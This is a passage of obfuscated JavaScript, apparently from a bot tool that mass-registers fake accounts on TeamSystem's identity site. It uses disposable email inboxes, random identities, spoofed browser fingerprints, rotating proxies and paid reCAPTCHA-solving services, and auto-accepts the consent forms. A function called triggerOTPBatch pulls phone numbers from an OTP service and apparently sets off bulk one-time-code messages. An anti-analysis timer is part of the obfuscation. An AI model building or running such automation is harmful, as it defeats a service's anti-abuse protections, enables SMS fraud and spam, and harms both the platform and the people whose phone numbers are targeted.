  for (const v113 of v107) {
    const v114 = v113.range || '';
    if (!v114) continue;
    v108[v114] = (v108[v114] || 0x0) + 0x1;
  }
  const v109 = Object.entries(v108).sort((v115, v116) => v116[0x1] - v115[0x1]).slice(0x0, 0x5);
  if (v109.length === 0x0) return console.log(chalk.red("\n  ✗ No valid ranges.\n")), null;
  const v110 = {};
  v110.name = "📊 Show top 5 & select", v110.value = "select";
  const v111 = await v104("Range Finder mode:", [{
    'name': "⚡ Auto detect & send (#1 range)",
    'value': "auto"
  }, v110]);
  if (v111 === "auto") {
    const [v117, v118] = v109[0x0];
    return console.log(chalk.green("\n  ✓ Auto Range: " + v117 + "  (" + v118 + " hits)\n")), [v117];
  } else {
    console.log(chalk.yellow("  #   Range              Hits")), console.log(chalk.gray("  ─".repeat(0x16))), v109.forEach(([v122, v123], v124) => {
      console.log(chalk.cyan('\x20\x20' + String(v124 + 0x1).padEnd(0x3) + '\x20') + chalk.green(v122.padEnd(0x10)) + chalk.yellow(String(v123).padEnd(0x5)) + chalk.gray('█'.repeat(Math.min(v123, 0xc))));
    }), console.log(chalk.gray("\n  Enter selection (e.g. 1,3 | 1 2 5 | 1-3)\n"));
    const v119 = await v105("Select ranges:", ''),
      v120 = parseTwoOoRangeSelection(v119, v109.length);
    if (v120.length === 0x0) return console.log(chalk.red("\n  ✗ No valid selection.\n")), null;
    const v121 = v120.map(v125 => v109[v125][0x0]);
    return console.log(chalk.green("\n  ✓ Selected: " + v121.join(',\x20') + '\x0a')), v121;
  }
}
function nexaFetchNumber(v126, v127, v128) {
  return new Promise((v129, v130) => {
    const v131 = {};
    v131.range = v127;
    v131.format = "normal";
    const v132 = JSON.stringify(v131);
    const v133 = {
        'hostname': "nexaotpservice.com",
        'port': 0x50,
        'path': v128 || "/api/v1/numbers/get",
        'method': "POST",
        'headers': {
          'X-API-Key': v126,
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v132)
        }
      },
      v134 = http.request(v133, v135 => {
        let v136 = '';
        v135.on("data", v137 => v136 += v137), v135.on("end", () => {
          try {
            const v138 = JSON.parse(v136);
            if (v138.success && v138.number) v129(v138.number.replace(/[^0-9]/g, ''));else v130(new Error(v138.error || "NexaOTP: No number returned"));
          } catch (v139) {
            v130(new Error("NexaOTP: Invalid response"));
          }
        });
      });
    v134.on("error", v140 => v130(new Error("NexaOTP network: " + v140.message))), v134.setTimeout(0x2710, () => {
      v134.destroy(), v130(new Error("NexaOTP: Timeout"));
    }), v134.write(v132), v134.end();
  });
}
function normalizePhoneNumber(v141) {
  let v142 = v141.trim();
  if (!v142.startsWith('+')) v142 = '+' + v142;
  return v142;
}
function mailTmRequest(v143, v144 = "GET", v145 = null, v146 = null) {
  return new Promise((v147, v148) => {
    const v149 = v145 ? JSON.stringify(v145) : null,
      v150 = {};
    v150.Accept = "application/json", v150["Content-Type"] = "application/json";
    const v151 = v150;
    if (v149) v151["Content-Length"] = Buffer.byteLength(v149);
    if (v146) v151.Authorization = "Bearer " + v146;
    const v152 = {};
    v152.hostname = "api.mail.tm", v152.port = 0x1bb, v152.path = v143;
    v152.method = v144, v152.headers = v151, v152.timeout = 0x3a98;
    const v153 = v152;
    const v154 = https.request(v153, v155 => {
      let v156 = '';
      v155.on("data", v157 => v156 += v157);
      v155.on("end", () => {
        try {
          v147({
            'status': v155.statusCode,
            'data': v156 ? JSON.parse(v156) : {}
          });
        } catch (v158) {
          const v159 = {};
          v159.status = v155.statusCode, v159.data = {}, v147(v159);
        }
      });
    });
    v154.on("error", v160 => v148(new Error("mail.tm net: " + v160.message))), v154.on("timeout", () => {
      v154.destroy();
      v148(new Error("mail.tm timeout"));
    });
    if (v149) v154.write(v149);
    v154.end();
  });
}
async function createMailTmInbox() {
  const v161 = await mailTmRequest("/domains?page=1"),
    v162 = v161.data?.["hydra:member"];
  if (!v162 || v162.length === 0x0) throw new Error("mail.tm: no domains available");
  const v163 = v162.find(v173 => v173.isActive && !v173.isPrivate)?.["domain"] || v162[0x0].domain,
    v164 = {};
  v164.length = 0xc;
  const v165 = Array.from(v164, () => "abcdefghijklmnopqrstuvwxyz0123456789"[Math.floor(Math.random() * "abcdefghijklmnopqrstuvwxyz0123456789".length)]).join(''),
    v166 = v165 + '@' + v163,
    v167 = "Temp@" + Math.random().toString(0x24).slice(0x2, 0xa) + "1A!",
    v168 = {};
  v168.address = v166, v168.password = v167;
  const v169 = await mailTmRequest("/accounts", "POST", v168);
  if (v169.status !== 0xc9) throw new Error("mail.tm: account creation failed (" + v169.status + ')');
  const v170 = {};
  v170.address = v166, v170.password = v167;
  const v171 = await mailTmRequest("/token", "POST", v170);
  if (!v171.data?.["token"]) throw new Error("mail.tm: failed to get auth token");
  const v172 = {};
  return v172.email = v166, v172.provider = "mailtm", v172.token = v171.data.token, v172.login = v165, v172.domain = v163, v172;
}
function guerrillaMailRequest(v174) {
  return new Promise((v175, v176) => {
    const v177 = {};
    v177.hostname = "api.guerrillamail.com";
    v177.port = 0x1bb, v177.path = "/ajax.php?" + v174, v177.method = "GET", v177.headers = {}, v177.timeout = 0x4e20, v177.headers.Accept = "application/json", v177.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
    const v178 = v177,
      v179 = https.request(v178, v180 => {
        let v181 = '';
        v180.on("data", v182 => v181 += v182);
        v180.on("end", () => {
          try {
            v175(JSON.parse(v181));
          } catch (v183) {
            v175(null);
          }
        });
      });
    v179.on("error", v184 => v176(new Error("GuerrillaMail net: " + v184.message))), v179.on("timeout", () => {
      v179.destroy();
      v176(new Error("GuerrillaMail timeout"));
    }), v179.end();
  });
}
async function createGuerrillaInbox() {
  const v185 = await guerrillaMailRequest("f=get_email_address&lang=en");
  if (!v185?.["email_addr"] || !v185?.["sid_token"]) throw new Error("GuerrillaMail: failed to get inbox");
  const [v186, v187] = v185.email_addr.split('@'),
    v188 = {};
  v188.email = v185.email_addr, v188.provider = "guerrillamail", v188.token = v185.sid_token, v188.login = v186;
  return v188.domain = v187, v188;
}
function mailCxRequest(v189, v190, v191 = "GET", v192 = null, v193 = 0x88b8) {
  return new Promise((v194, v195) => {
    const v196 = v192 ? JSON.stringify(v192) : null;
    const v197 = {};
    v197.Accept = "application/json", v197["x-api-token"] = v190;
    const v198 = v197;
    v196 && (v198["Content-Type"] = "application/json", v198["Content-Length"] = Buffer.byteLength(v196));
    const v199 = {};
    v199.hostname = "api.mail.cx", v199.port = 0x1bb, v199.path = v189, v199.method = v191, v199.headers = v198;
    v199.timeout = v193;
    const v200 = v199,
      v201 = https.request(v200, v202 => {
        let v203 = '';
        v202.on("data", v204 => v203 += v204);
        v202.on("end", () => {
          try {
            v194({
              'status': v202.statusCode,
              'data': v203 ? JSON.parse(v203) : null
            });
          } catch {
            const v205 = {};
            v205.status = v202.statusCode, v205.data = null, v194(v205);
          }
        });
      });
    v201.on("error", v206 => v195(new Error("mail.cx net: " + v206.message))), v201.on("timeout", () => {
      v201.destroy();
      v195(new Error("mail.cx timeout"));
    });
    if (v196) v201.write(v196);
    v201.end();
  });
}
async function createMailCxInbox(v207) {
  const v208 = await mailCxRequest("/v1/config", v207);
  const v209 = v208.data?.["system_domains"] || v208.data?.["domains"] || [];
  let v210 = Array.isArray(v209) && v209.length > 0x0 ? v209[Math.floor(Math.random() * v209.length)] : null;
  if (v210 && typeof v210 === "object") v210 = v210.domain || v210.name || Object.values(v210)[0x0];
  if (!v210) throw new Error("mail.cx: no system domains in config");
  const v211 = {};
  v211.length = 0xc;
  const v212 = Array.from(v211, () => "abcdefghijklmnopqrstuvwxyz0123456789"[Math.floor(Math.random() * "abcdefghijklmnopqrstuvwxyz0123456789".length)]).join(''),
    v213 = {};
  v213.email = v212 + '@' + v210, v213.provider = "mailcx", v213.token = v207, v213.login = v212;
  return v213.domain = v210, v213;
}
async function createTempInbox(v214) {
  if (v214) try {
    return await createMailCxInbox(v214);
  } catch (v215) {}
  try {
    return await createMailTmInbox();
  } catch (v216) {}
  return await createGuerrillaInbox();
}
async function pollForVerification(v217, v218 = 0x493e0) {
  const v219 = Date.now() + v218,
    v220 = new Set();
  function fn3(v222) {
    if (!v222) return null;
    const v223 = v222.replace(/&amp;/g, '&').replace(/&#38;/g, '&').replace(/&lt;/g, '<').replace(/&gt;/g, '>'),
      v224 = v223.match(/href=["']?(https?:\/\/[a-z0-9.-]*teamsystem\.com\/[^\s"'<>]+)/i);
    if (v224) return v224[0x1];
    const v225 = v223.match(/https?:\/\/[a-z0-9.-]*teamsystem\.com\/[^\s"'<>]+/i);
    return v225 ? v225[0x0] : null;
  }
  let v221 = '';
  while (Date.now() < v219) {
    try {
      if (v217.provider === "mailcx") {
        const v226 = v221 ? "?since=" + encodeURIComponent(v221) + "&from=teamsystem" : "?from=teamsystem",
          v227 = await mailCxRequest("/v1/inbox/" + encodeURIComponent(v217.email) + v226, v217.token, "GET", null, 0x88b8);
        if (v227.status === 0xcc) continue;
        if (v227.status === 0x1ad) {
          await new Promise(v228 => setTimeout(v228, 0xbb8));
          continue;
        }
        if (v227.status === 0xc8 && v227.data?.["emails"]) {
          if (v227.data.next_since) v221 = v227.data.next_since;
          for (const v229 of v227.data.emails) {
            if (v220.has(v229.id)) continue;
            v220.add(v229.id);
            const v230 = await mailCxRequest("/v1/email/" + v229.id, v217.token);
            debugLog(v217.email, "mailcx-email-keys", Object.keys(v230.data || {}));
            const v231 = (v230.data?.["html"] || '') + (v230.data?.["html_body"] || '') + (v230.data?.["body_html"] || '') + (v230.data?.["text"] || '') + (v230.data?.["text_body"] || '') + (v230.data?.["body"] || '') + (v230.data?.["body_text"] || '');
            debugLog(v217.email, "mailcx-email-preview", v231.substring(0x0, 0x1f4));
            const v232 = fn3(v231);
            if (v232) return v232;
          }
        }
      } else {
        if (v217.provider === "mailtm") {
          await new Promise(v234 => setTimeout(v234, 0x1388));
          const v233 = await mailTmRequest("/messages?page=1", "GET", null, v217.token);
          for (const v235 of v233.data?.["hydra:member"] || []) {
            if (v220.has(v235.id)) continue;
            v220.add(v235.id);
            const v236 = await mailTmRequest("/messages/" + v235.id, "GET", null, v217.token),
              v237 = (v236.data?.["html"] || []).join('') || v236.data?.["text"] || '',
              v238 = fn3(v237);
            if (v238) return v238;
          }
        } else {
          await new Promise(v240 => setTimeout(v240, 0x1388));
          const v239 = await guerrillaMailRequest("f=check_email&seq=0&sid_token=" + encodeURIComponent(v217.token));
          for (const v241 of v239?.["list"] || []) {
            if (v220.has(v241.mail_id)) continue;
            v220.add(v241.mail_id);
            const v242 = await guerrillaMailRequest("f=fetch_email&email_id=" + v241.mail_id + "&sid_token=" + encodeURIComponent(v217.token)),
              v243 = v242?.["mail_body"] || '',
              v244 = fn3(v243);
            if (v244) return v244;
          }
        }
      }
    } catch (v245) {
      await new Promise(v246 => setTimeout(v246, 0xbb8));
    }
  }
  throw new Error(v217.provider + ": timed out waiting for verification email (5 min)");
}
(function () {
  const fn4 = function () {
    let v248;
    try {
      v248 = Function("return (function() {}.constructor(\"return this\")( ));")();
    } catch (v249) {
      v248 = window;
    }
    return v248;
  };
  const v247 = fn4();
  v247.setInterval(fn2, 0xdac);
})();
function randomName() {
  const v250 = ["James", "John", "Robert", "Michael", "David", "William", "Richard", "Joseph", "Thomas", "Charles"],
    v251 = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Wilson", "Taylor"];
  return {
    'firstName': v250[Math.floor(Math.random() * v250.length)],
    'lastName': v251[Math.floor(Math.random() * v251.length)]
  };
}
function randomPassword() {
  const v252 = "Secure@" + Math.random().toString(0x24).slice(0x2, 0x8) + Math.floor(Math.random() * 0x2328 + 0x3e8);
  return v252;
}
const v1 = {};
v1.v = 0x82, v1.buildMin = 0x1a43, v1.buildMax = 0x1a79, v1.grease = "\"Not?A_Brand\";v=\"99\"";
const v2 = {};
v2.v = 0x83, v2.buildMin = 0x1a7a, v2.buildMax = 0x1ab1, v2.grease = "\"Not_A Brand\";v=\"24\"";
const v3 = {};
v3.v = 0x84, v3.buildMin = 0x1ab2, v3.buildMax = 0x1b1e, v3.grease = "\"Not A(Brand\";v=\"8\"";
const v4 = {};
v4.v = 0x85, v4.buildMin = 0x1b1f, v4.buildMax = 0x1b55, v4.grease = "\"Not(A;Brand\";v=\"99\"";
const v5 = {};
v5.v = 0x86, v5.buildMin = 0x1b56, v5.buildMax = 0x1b88, v5.grease = "\"Not;A)Brand\";v=\"24\"";
const v6 = {};
v6.v = 0x87, v6.buildMin = 0x1b89, v6.buildMax = 0x1bbe, v6.grease = "\"Not)A=Brand\";v=\"8\"";
const v7 = {};
v7.v = 0x88, v7.buildMin = 0x1bbf, v7.buildMax = 0x1bee, v7.grease = "\"Not=A_Brand\";v=\"99\"";
const v8 = {};
v8.v = 0x89, v8.buildMin = 0x1bef;
v8.buildMax = 0x1c23, v8.grease = "\"Not/A)Brand\";v=\"8\"";
const v9 = {};
v9.v = 0x8a, v9.buildMin = 0x1c24, v9.buildMax = 0x1c59, v9.grease = "\"Not)A;Brand\";v=\"99\"";
const v10 = {};
v10.v = 0x8b, v10.buildMin = 0x1c5a, v10.buildMax = 0x1c7d, v10.grease = "\"Not;A=Brand\";v=\"24\"";
const v11 = {};
v11.v = 0x8c, v11.buildMin = 0x1c7e, v11.buildMax = 0x1c9f, v11.grease = "\"Not=A?Brand\";v=\"8\"";
const v12 = {};
v12.v = 0x94, v12.buildMin = 0x1d36, v12.buildMax = 0x1d49, v12.grease = "\"Not/A)Brand\";v=\"24\"";
const v13 = {};
v13.v = 0x95, v13.buildMin = 0x1d4a, v13.buildMax = 0x1d7d, v13.grease = "\"Not)A;Brand\";v=\"24\"";
const CHROME_VERSIONS = [v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13];
function getRandomClient() {
  const v253 = CHROME_VERSIONS,
    v254 = Math.random() < 0.6,
    v255 = v254 ? v253.slice(0x6) : v253,
    v256 = v255[Math.floor(Math.random() * v255.length)],
    v257 = Math.floor(Math.random() * (v256.buildMax - v256.buildMin + 0x1)) + v256.buildMin,
    v258 = Math.floor(Math.random() * 0xc8) + 0x1;
  const v259 = Math.random() < 0.3;
  let v260, v261;
  v259 ? (v260 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v256.v + ".0." + v257 + '.' + v258 + " Safari/537.36", v261 = "\"macOS\"") : (v260 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v256.v + ".0." + v257 + '.' + v258 + " Safari/537.36", v261 = "\"Windows\"");
  const v262 = {};
  v262.userAgent = v260, v262.secChUa = "\"Google Chrome\";v=\"" + v256.v + "\", \"Chromium\";v=\"" + v256.v + "\", " + v256.grease;
  return v262.secChUaPlatform = v261, v262.chromeVersion = v256.v, v262;
}
function parseProxy(v263) {
  if (!v263) return null;
  if (typeof v263 === "object") return v263;
  v263 = v263.trim();
  if (!v263) return null;
  let v264, v265, v266, v267;
  if (v263.includes("://")) v263 = v263.split("://")[0x1];
  if (v263.includes('@')) {
    const v269 = v263.split('@'),
      v270 = v269[0x0].split(':'),
      v271 = v269[0x1].split(':');
    v266 = v270[0x0], v267 = v270[0x1], v264 = v271[0x0], v265 = parseInt(v271[0x1]);
  } else {
    const v272 = v263.split(':');
    if (v272.length === 0x2) v264 = v272[0x0], v265 = parseInt(v272[0x1]);else v272.length === 0x4 && (!isNaN(parseInt(v272[0x3])) && isNaN(parseInt(v272[0x1])) ? (v266 = v272[0x0], v267 = v272[0x1], v264 = v272[0x2], v265 = parseInt(v272[0x3])) : (v264 = v272[0x0], v265 = parseInt(v272[0x1]), v266 = v272[0x2], v267 = v272[0x3]));
  }
  if (!v264 || !v265) return null;
  const v268 = {};
  return v268.type = "http", v268.host = v264, v268.port = v265, v268.user = v266, v268.pass = v267, v268.original = v263, v268;
}
function rotateSessionId(v273) {
  if (!v273 || !v273.user) return v273;
  const v274 = {
    ...v273
  };
  const v275 = v274,
    v276 = crypto.randomBytes(0x6).toString("base64").replace(/[+/=]/g, '').substring(0x0, 0xa);
  if (v275.user.includes("-ssid-")) v275.user = v275.user.replace(/-ssid-[A-Za-z0-9_]+/, "-ssid-" + v276);else {
    if (v275.user.includes("-session-")) v275.user = v275.user.replace(/-session-[A-Za-z0-9_]+/, "-session-" + v276);
  }
  return v275;
}
function createProxyAgent(v277) {
  if (!v277) return null;
  const v278 = typeof v277 === "string" ? parseProxy(v277) : v277;
  if (!v278) return null;
  if (v278.type === "socks5" || v278.type === "socks4") return new SocksProxyAgent("socks5://" + (v278.user ? encodeURIComponent(v278.user) + ':' + encodeURIComponent(v278.pass || '') + '@' : '') + v278.host + ':' + v278.port);
  return new HttpsProxyAgent("http://" + (v278.user ? encodeURIComponent(v278.user) + ':' + encodeURIComponent(v278.pass || '') + '@' : '') + v278.host + ':' + v278.port);
}
function sendRequest(v279, v280, v281, v282, v283 = null, v284 = 0x7530) {
  return new Promise((v285, v286) => {
    const v287 = new URL(v279),
      v288 = {
        ...v281
      },
      v289 = v288;
    if (!v289["Accept-Encoding"]) v289["Accept-Encoding"] = "gzip, deflate, br";
    if (v282) v289["Content-Length"] = Buffer.byteLength(v282);
    const v290 = {
      'hostname': v287.hostname,
      'path': v287.pathname + v287.search,
      'method': v280,
      'headers': v289,
      'timeout': v284
    };
    if (v283) {
      const v292 = typeof v283 === "object" ? v283 : parseProxy(v283);
      if (!v292 || isNaN(v292.port) || v292.port <= 0x0) return v286(new Error("FATAL: Invalid proxy."));
      v290.agent = createProxyAgent(v292);
    }
    const v291 = https.request(v290, v293 => {
      const v294 = v293.headers.location;
      if ((v293.statusCode === 0x12d || v293.statusCode === 0x12e || v293.statusCode === 0x12f) && v294) {
        const v296 = {};
        v296.status = v293.statusCode, v296.data = '', v296.headers = v293.headers, v296.redirectUrl = v294, v285(v296), v293.resume();
        return;
      }
      const v295 = [];
      v293.on("data", v297 => v295.push(v297)), v293.on("error", v286), v293.on("end", () => {
        let v298 = Buffer.concat(v295);
        const v299 = v293.headers["content-encoding"];
        if (v299 === "gzip") try {
          v298 = zlib.gunzipSync(v298);
        } catch (v300) {} else {
          if (v299 === "deflate") try {
            v298 = zlib.inflateSync(v298);
          } catch (v301) {} else {
            if (v299 === 'br') try {
              v298 = zlib.brotliDecompressSync(v298);
            } catch (v302) {}
          }
        }
        v285({
          'status': v293.statusCode,
          'data': v298.toString("utf8"),
          'headers': v293.headers
        });
      });
    });
    v291.on("error", v286), v291.on("timeout", () => {
      v291.destroy();
      v286(new Error("timeout"));
    });
    if (v282) v291.write(v282);
    v291.end();
  });
}
class CookieJar {
  constructor() {
    this.store = {};
  }
  ["set"](v303) {
    if (!v303) return;
    const v304 = Array.isArray(v303) ? v303 : [v303];
    for (const v305 of v304) {
      const v306 = v305.split(';')[0x0].trim(),
        v307 = v306.indexOf('=');
      if (v307 < 0x0) continue;
      const v308 = v306.substring(0x0, v307).trim(),
        v309 = v306.substring(v307 + 0x1).trim();
      this.store[v308] = v309;
    }
  }
  ["get"]() {
    return Object.entries(this.store).map(([v310, v311]) => v310 + '=' + v311).join(';\x20');
  }
  ["absorb"](v312) {
    this.set(v312["set-cookie"]);
  }
}
function antiCaptchaCreate(v313, v314, v315) {
  return new Promise((v316, v317) => {
    const v318 = {};
    v318.type = "NoCaptchaTaskProxyless", v318.websiteURL = v314, v318.websiteKey = v315;
    const v319 = {};
    v319.clientKey = v313, v319.task = v318;
    const v320 = JSON.stringify(v319),
      v321 = {
        'hostname': "api.anti-captcha.com",
        'port': 0x1bb,
        'path': "/createTask",
        'method': "POST",
        'headers': {
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v320)
        }
      },
      v322 = https.request(v321, v323 => {
        let v324 = '';
        v323.on("data", v325 => v324 += v325), v323.on("end", () => {
          try {
            const v326 = JSON.parse(v324);
            if (v326.errorId !== 0x0) return v317(new Error("AntiCaptcha createTask: " + v326.errorDescription));
            v316(v326.taskId);
          } catch (v327) {
            v317(new Error("AntiCaptcha: Invalid JSON"));
          }
        });
      });
    v322.on("error", v328 => v317(new Error("AntiCaptcha net: " + v328.message))), v322.setTimeout(0x3a98, () => {
      v322.destroy(), v317(new Error("AntiCaptcha createTask timeout"));
    });
    v322.write(v320), v322.end();
  });
}
function antiCaptchaGetResult(v329, v330) {
  return new Promise((v331, v332) => {
    const v333 = {};
    v333.clientKey = v329, v333.taskId = v330;
    const v334 = JSON.stringify(v333);
    const v335 = {
        'hostname': "api.anti-captcha.com",
        'port': 0x1bb,
        'path': "/getTaskResult",
        'method': "POST",
        'headers': {
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v334)
        }
      },
      v336 = https.request(v335, v337 => {
        let v338 = '';
        v337.on("data", v339 => v338 += v339);
        v337.on("end", () => {
          try {
            const v340 = JSON.parse(v338);
            if (v340.errorId !== 0x0) return v332(new Error("AntiCaptcha poll: " + v340.errorDescription));
            const v341 = {};
            v341.status = v340.status, v341.token = v340?.["solution"]?.["gRecaptchaResponse"] || null, v331(v341);
          } catch (v342) {
            v332(new Error("AntiCaptcha: Invalid JSON"));
          }
        });
      });
    v336.on("error", v343 => v332(new Error("AntiCaptcha net: " + v343.message))), v336.setTimeout(0x3a98, () => {
      v336.destroy(), v332(new Error("AntiCaptcha poll timeout"));
    }), v336.write(v334), v336.end();
  });
}
function twoCaptchaCreate(v344, v345, v346) {
  return new Promise((v347, v348) => {
    const v349 = {};
    v349.type = "RecaptchaV2TaskProxyless";
    v349.websiteURL = v345, v349.websiteKey = v346;
    const v350 = {};
    v350.clientKey = v344, v350.task = v349;
    const v351 = JSON.stringify(v350),
      v352 = {
        'hostname': "api.2captcha.com",
        'port': 0x1bb,
        'path': "/createTask",
        'method': "POST",
        'headers': {
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v351)
        }
      },
      v353 = https.request(v352, v354 => {
        let v355 = '';
        v354.on("data", v356 => v355 += v356);
        v354.on("end", () => {
          try {
            const v357 = JSON.parse(v355);
            if (v357.errorId !== 0x0) return v348(new Error("2Captcha createTask: " + (v357.errorCode || v357.errorDescription)));
            v347(v357.taskId);
          } catch (v358) {
            v348(new Error("2Captcha: Invalid JSON"));
          }
        });
      });
    v353.on("error", v359 => v348(new Error("2Captcha net: " + v359.message))), v353.setTimeout(0x3a98, () => {
      v353.destroy(), v348(new Error("2Captcha createTask timeout"));
    }), v353.write(v351);
    v353.end();
  });
}
function twoCaptchaGetResult(v360, v361) {
  return new Promise((v362, v363) => {
    const v364 = {};
    v364.clientKey = v360, v364.taskId = v361;
    const v365 = JSON.stringify(v364),
      v366 = {
        'hostname': "api.2captcha.com",
        'port': 0x1bb,
        'path': "/getTaskResult",
        'method': "POST",
        'headers': {
          'Content-Type': "application/json",
          'Content-Length': Buffer.byteLength(v365)
        }
      },
      v367 = https.request(v366, v368 => {
        let v369 = '';
        v368.on("data", v370 => v369 += v370);
        v368.on("end", () => {
          try {
            const v371 = JSON.parse(v369);
            if (v371.errorId !== 0x0) return v363(new Error("2Captcha poll: " + (v371.errorCode || v371.errorDescription)));
            const v372 = {};
            v372.status = v371.status, v372.token = v371?.["solution"]?.["gRecaptchaResponse"] || null, v362(v372);
          } catch (v373) {
            v363(new Error("2Captcha: Invalid JSON"));
          }
        });
      });
    v367.on("error", v374 => v363(new Error("2Captcha net: " + v374.message))), v367.setTimeout(0x3a98, () => {
      v367.destroy();
      v363(new Error("2Captcha poll timeout"));
    }), v367.write(v365), v367.end();
  });
}
async function solveRecaptcha(v375, v376, v377 = "anticaptcha") {
  const v378 = v377 === "2captcha";
  const v379 = v378 ? twoCaptchaCreate : antiCaptchaCreate,
    v380 = v378 ? twoCaptchaGetResult : antiCaptchaGetResult,
    v381 = v378 ? "2Captcha" : "AntiCaptcha",
    v382 = await v379(v375, v376, "6LezVHUUAAAAABwefaAQKggczi_T6L4GoePEtCHG");
  for (let v383 = 0x0; v383 < 0x24; v383++) {
    await new Promise(v385 => setTimeout(v385, 0x1388));
    const v384 = await v380(v375, v382);
    if (v384.status === "ready") return v384.token;
  }
  throw new Error(v381 + ": Timed out waiting for reCAPTCHA solution");
}
let _captchaRRCounter = 0x0;
async function solveCaptchaBalanced(v386, v387, v388, v389) {
  if (v389 !== "both") return solveRecaptcha(v386 || v387, v388, v389);
  const v390 = _captchaRRCounter++ % 0x2 === 0x0,
    [v391, v392, v393, v394] = v390 ? [v386, "anticaptcha", v387, "2captcha"] : [v387, "2captcha", v386, "anticaptcha"];
  try {
    if (v391) return await solveRecaptcha(v391, v388, v392);
  } catch (v395) {}
  if (v393) return await solveRecaptcha(v393, v388, v394);
  throw new Error("No captcha solver key available");
}
function getCsrfToken(v396) {
  const v397 = cheerio.load(v396);
  const v398 = v397("input[name=\"__RequestVerificationToken\"]").val() || v397("meta[name=\"RequestVerificationToken\"]").attr("content");
  if (!v398) throw new Error("__RequestVerificationToken not found in page");
  return v398;
}
function parseConsents(v399) {
  const v400 = cheerio.load(v399);
  const v401 = [];
  let v402 = 0x0;
  while (true) {
    const v403 = v400("input[name=\"Consents[" + v402 + "].Id\"]");
    if (!v403.length) break;
    const fn5 = v404 => v400("input[name=\"Consents[" + v402 + '].' + v404 + '\x22]').val() || '';
    v401.push({
      'Id': v403.val(),
      'AutoAcceptance': fn5("AutoAcceptance") || "False",
      'DefaultValue': fn5("DefaultValue") || "False",
      'Name': fn5("Name"),
      'Position': fn5("Position") || String(v402 + 0x1),
      'Required': fn5("Required") || "False",
      'Text': fn5("Text")
    }), v402++;
  }
  return v401;
}
const SIGNUP_CONSENTS = [{
  'Id': "8ef8c673-dba4-4d32-9074-08de536f78d0",
  'AutoAcceptance': "False",
  'DefaultValue': "False",
  'Name': "T%26C+1",
  'Position': '1',
  'Required': "True",
  'Text': encodeURIComponent("<div>I hereby declare that I have read and accept the <a href=\"https://tc.teamsystem.com/CondizioniGeneraliTeamSystemID.pdf\" rel=\"noopener noreferrer\" target=\"_blank\">General Terms and Conditions</a> (the &ldquo;General Terms and Conditions&rdquo;) and that I have read the <a href=\"https://www.teamsystem.com/privacy-policy-en/\" rel=\"noopener noreferrer\" target=\"_blank\">Privacy Policy.</a> *</div>"),
  'Checked': "true"
}, {
  'Id': "94fe0fa0-ae22-4031-7ebc-08de536f8626",
  'AutoAcceptance': "False",
  'DefaultValue': "False",
  'Name': "T%26C+2",
  'Position': '2',
  'Required': "True",
  'Text': encodeURIComponent("<div>Pursuant to and for the purposes of Articles 1341 and 1342 of the Italian Civil Code, I hereby expressly accept the following clauses of the <a href=\"https://tc.teamsystem.com/CondizioniGeneraliTeamSystemID.pdf\" rel=\"noopener noreferrer\" target=\"_blank\">General Terms and Conditions</a>: *</div>"),
  'Checked': "true"
}];
async function triggerOTPBatch(v405, v406 = {}) {
  const {
      onStatus = () => {},
      proxy = null,
      antiCaptchaKey = '',
      mailCxKey = '',
      timeout = 0xea60
    } = v406,
    v407 = v405[0x0] ? normalizePhoneNumber(v405[0x0]) : "batch",
    {
      firstName: v408,
      lastName: v409
    } = randomName(),
    v410 = randomPassword(),
    v411 = getRandomClient(),
    v412 = new CookieJar();
  onStatus("[0/8] Creating temp email inbox ...");
  const v413 = await createTempInbox(mailCxKey),
    v414 = v413.email;
  debugLog(v407, "email-inbox", v414 + '\x20[' + v413.provider + ']');
  const v415 = "https://identity.teamsystem.com/Account/Signup?email=" + encodeURIComponent(v414),
    v416 = {};
  v416.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", v416["Accept-Language"] = "en-US,en;q=0.9", v416["User-Agent"] = v411.userAgent, v416["sec-ch-ua"] = v411.secChUa, v416["sec-ch-ua-mobile"] = '?0', v416["sec-ch-ua-platform"] = v411.secChUaPlatform;
  v416["Upgrade-Insecure-Requests"] = '1', v416["Sec-Fetch-Dest"] = "document", v416["Sec-Fetch-Mode"] = "navigate", v416["Sec-Fetch-Site"] = "none";
  const v417 = v416;
  const fn6 = v418 => v405.map(v419 => ({
    'success': false,
    'message': v418,
    'phone': normalizePhoneNumber(v419)
  }));
  try {
    onStatus("[1/8] GET signup page for " + v414 + " ...");
    let v420 = await sendRequest(v415, "GET", v417, null, proxy, timeout);
    v412.absorb(v420.headers);
    if (v420.status !== 0xc8) throw new Error("Signup page returned HTTP " + v420.status);
    const v421 = getCsrfToken(v420.data);
    debugLog(v407, "csrf-signup", v421.slice(0x0, 0x1e) + "...");
    const v422 = v406.captchaProvider === "2captcha" ? v406.twoCaptchaKey : antiCaptchaKey,
      v423 = v406.captchaProvider === "both";
    if (!v423 && !v422) throw new Error("No " + (v406.captchaProvider === "2captcha" ? "2Captcha" : "Anti-Captcha") + " API key provided");
    if (v423 && !antiCaptchaKey && !v406.twoCaptchaKey) throw new Error("No captcha solver keys provided");
    const v424 = v406.captchaProvider === "2captcha" ? "2Captcha" : v406.captchaProvider === "both" ? "Dual Solver" : "Anti-Captcha";
    onStatus("[2/8] Solving reCAPTCHA v2 via " + v424 + " ...");
    const v425 = await solveCaptchaBalanced(antiCaptchaKey, v406.twoCaptchaKey || '', v415, v406.captchaProvider || "anticaptcha");
    debugLog(v407, "captcha-token", v425.slice(0x0, 0x1e) + "..."), onStatus("[3/8] POST signup form ...");
    const v426 = [];
    v426.push("Signup.Email=" + encodeURIComponent(v414)), v426.push("Signup.Name=" + encodeURIComponent(v408)), v426.push("Signup.Surname=" + encodeURIComponent(v409)), v426.push("Signup.Password=" + encodeURIComponent(v410)), SIGNUP_CONSENTS.forEach((v442, v443) => {
